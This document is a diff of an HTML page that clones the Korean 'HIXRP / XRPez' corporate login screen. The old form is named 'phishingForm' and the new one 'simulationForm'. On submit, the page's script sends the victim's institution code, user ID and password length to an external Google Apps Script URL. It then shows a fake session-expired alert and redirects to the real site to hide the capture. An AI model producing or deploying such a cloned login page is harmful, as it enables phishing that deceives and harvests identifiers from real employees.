@@ -1,203 +1,166 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HIXRP 로그인</title>
     <style>
-        /* 폰트 및 기본 배경: 실제 HIXRP 스타일 반영 */
-        body { 
-            font-family: 'Malgun Gothic', 'Apple SD Gothic Neo', sans-serif; 
-            margin: 0; 
-            height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            background-color: #f0f4f9; /* HIXRP 특유의 연한 블루그레이 배경 */
-            background-image: linear-gradient(135deg, #dae9ff 0%, #f0f4f9 100%);
-        }
-
-        /* 전체 컨테이너 레이아웃 */
-        .login_wrap {
+        /* 배경 설정: 깃허브에 올린 background.png 사용 */
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
             display: flex;
-            width: 1000px; /* 이미지의 일러스트 영역까지 고려한 너비 */
-            background: #fff;
-            padding: 50px;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Malgun Gothic', '맑은 고딕', sans-serif;
+            background: url('background.png') no-repeat center center;
+            background-size: cover;
+        }
+
+        /* 로그인 컨테이너 */
+        .login-box {
+            width: 350px;
+            background: #ffffff;
+            padding: 40px 30px;
             border-radius: 12px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.08);
-            position: relative;
-            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: center;
+            /* 배경 이미지 레이아웃에 맞춰 위치 조정 (필요시 수정) */
+            margin-right: 320px; 
         }
 
-        /* 왼쪽 로그인 영역 */
-        #login_home {
-            flex: 1;
-            max-width: 380px;
-            z-index: 2;
+        .logo-area img {
+            max-width: 150px;
+            margin-bottom: 30px;
         }
 
-        .logo_area { margin-bottom: 40px; }
-        .logo_area h2 { font-size: 32px; color: #1a2660; margin: 0; font-weight: 800; }
-        .logo_area span { color: #7cb342; }
+        .input-group {
+            margin-bottom: 12px;
+            text-align: left;
+        }
 
-        /* 입력 폼 스타일: 형이 준 소스 기반 */
-        .input_box { margin-bottom: 12px; }
-        .input_box label { display: block; font-size: 11px; font-weight: bold; color: #5579a6; margin-bottom: 6px; text-transform: uppercase; }
-        .input_box input { 
-            width: 100%; 
-            padding: 12px; 
-            border: 1px solid #9dbce3; 
-            border-radius: 4px; 
-            box-sizing: border-box; 
+        .input-group label {
+            display: block;
+            font-size: 11px;
+            font-weight: bold;
+            color: #5579a6;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #9dbce3;
+            border-radius: 4px;
+            box-sizing: border-box;
             font-size: 14px;
-            background-color: #fff;
         }
 
-        .btnLogin { 
-            width: 100%; 
-            padding: 14px; 
-            background-color: #1a2660; 
-            color: white; 
-            border: none; 
-            border-radius: 4px; 
-            cursor: pointer; 
-            font-weight: bold; 
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a2660;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
             font-size: 15px;
-            margin-top: 15px; 
+            margin-top: 10px;
         }
 
-        .retCrtBtn { 
-            width: 100%; 
-            padding: 11px; 
-            background: none; 
-            border: 1px solid #ccc; 
-            margin-top: 10px; 
-            cursor: pointer; 
-            color: #666; 
+        .btn-resign {
+            width: 100%;
+            padding: 10px;
+            background: none;
+            border: 1px solid #ccc;
+            margin-top: 10px;
+            cursor: pointer;
+            color: #666;
             font-size: 13px;
             border-radius: 4px;
         }
 
-        .loginOpt { margin-top: 25px; font-size: 12px; color: #666; display: flex; gap: 15px; justify-content: center; }
-        .loginCmt { margin-top: 25px; text-align: center; font-size: 12px; border-top: 1px solid #eee; padding-top: 20px; }
-        .loginCmt a { color: #666; text-decoration: none; margin: 0 8px; }
-        .right { text-align: center; font-size: 10px; color: #aaa; margin-top: 40px; }
-
-        /* 오른쪽 일러스트레이션 영역 */
-        .illustration_area {
-            flex: 1.2;
+        .options {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
             display: flex;
-            justify-content: flex-end;
-            align-items: center;
-        }
-        .illustration_area img {
-            max-width: 90%;
-            height: auto;
+            justify-content: center;
+            gap: 15px;
         }
 
-        /* 캡스락 툴팁 */
-        #password-tooltip {
-            display: none;
-            position: absolute;
-            background: #fff;
-            border: 1px solid #ddd;
-            padding: 5px 10px;
+        .footer-links {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
             font-size: 11px;
-            color: #d9534f;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            margin-top: 5px;
         }
+
+        .footer-links a { color: #666; text-decoration: none; margin: 0 5px; }
+        .copyright { margin-top: 30px; font-size: 10px; color: #aaa; }
     </style>
 </head>
 <body>
 
-    <div class="login_wrap">
-        <div id="login_home">
-            <div class="logo_area">
-                <h2>XRP<span>ez</span></h2>
-            </div>
-
-            <form id="phishingForm">
-                <div class="input_box">
-                    <label for="entCd">CODE</label>
-                    <input type="text" id="entCd" placeholder="기관코드" required>
-                </div>
-                <div class="input_box">
-                    <label for="id">ID</label>
-                    <input type="text" id="id" placeholder="아이디" required>
-                </div>
-                <div class="input_box">
-                    <label for="password">PASSWORD</label>
-                    <input type="password" id="password" placeholder="비밀번호" required>
-                    <div id="password-tooltip"><b>&lt;Caps Lock&gt;</b>이 켜져 있습니다.</div>
-                </div>
-
-                <button type="button" class="btnLogin" onClick="loginStart();">로그인</button>
-            </form>
-
-            <button class="retCrtBtn">퇴사자 증명 신청</button>
-
-            <div class="loginOpt">
-                <label><input type="checkbox"> 기관코드저장</label>
-                <label><input type="checkbox"> 아이디저장</label>
-            </div>
-
-            <div class="loginCmt">
-                <a href="#">IP승인요청</a>
-                <a href="#">비밀번호 찾기</a>
-                <a href="#"><strong>개인정보처리방침</strong></a>
-            </div>
-            <p class="right">ⓒ HIPERTECH Corp. All Rights Reserved.</p>
+    <div class="login-box">
+        <div class="logo-area">
+            <img src="logo.png" alt="XRP ez">
         </div>
 
-        <!-- 형이 준 이미지 링크 적용 영역 -->
-        <div class="illustration_area">
-            <img src="blob:https://gnk.hixrp.kr/ea64a603-1e67-4a44-b272-a880b3cadd8d" alt="illustration" onerror="this.src='https://via.placeholder.com/500x400?text=Illustration+Missing'">
+        <form id="simulationForm">
+            <div class="input-group">
+                <label>CODE</label>
+                <input type="text" id="entCd" placeholder="기관코드" required>
+            </div>
+            <div class="input-group">
+                <label>ID</label>
+                <input type="text" id="userId" placeholder="아이디" required>
+            </div>
+            <div class="input-group">
+                <label>PASSWORD</label>
+                <input type="password" id="userPw" placeholder="비밀번호" required>
+            </div>
+
+            <button type="submit" class="btn-login">로 그 인</button>
+        </form>
+
+        <button class="btn-resign">퇴사자 증명 신청</button>
+
+        <div class="options">
+            <label><input type="checkbox"> 기관코드저장</label>
+            <label><input type="checkbox"> 아이디저장</label>
         </div>
+
+        <div class="footer-links">
+            <a href="#">IP승인요청</a> | <a href="#">비밀번호 찾기</a> | <a href="#"><strong>개인정보처리방침</strong></a>
+        </div>
+
+        <p class="copyright">ⓒ HIPERTECH Corp. All Rights Reserved.</p>
     </div>
 
     <script>
-        // 형이 준 GAS URL
         const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';
 
-        const sendToGas = (target, input, pwLen) => {
-            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(target)}&inputId=${encodeURIComponent(input)}&pwLen=${pwLen}`;
-            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
-        };
+        document.getElementById('simulationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-        function loginStart() {
-            const entCd = document.getElementById("entCd").value;
-            const id = document.getElementById("id").value;
-            const password = document.getElementById("password").value;
-
-            if (!entCd || !id || !password) {
-                alert("정보를 입력해 주세요.");
-                return;
-            }
+            const entCd = document.getElementById('entCd').value;
+            const id = document.getElementById('userId').value;
+            const pw = document.getElementById('userPw').value;
 
             // 로그 전송
-            sendToGas(entCd, id, password.length);
+            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(entCd)}&inputId=${encodeURIComponent(id)}&pwLen=${pw.length}`;
+            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
 
-            // 리다이렉트
+            // 최종 리다이렉트 주소 반영
             setTimeout(() => {
                 alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
-                window.location.href = 'https://gnware.gnk.or.kr/login';
+                window.location.href = 'https://gnk.hixrp.kr/index.jsp';
             }, 500);
-        }
-
-        // 캡스락 감지 로직
-        document.querySelector("#password").addEventListener("keyup", function(e) {
-            if (e.getModifierState("CapsLock")) {
-                document.getElementById("password-tooltip").style.display = "block";
-            } else {
-                document.getElementById("password-tooltip").style.display = "none";
-            }
-        });
-
-        // 엔터키 지원
-        window.addEventListener('keydown', function(e) {
-            if (e.keyCode == 13) loginStart();
         });
     </script>
 </body>
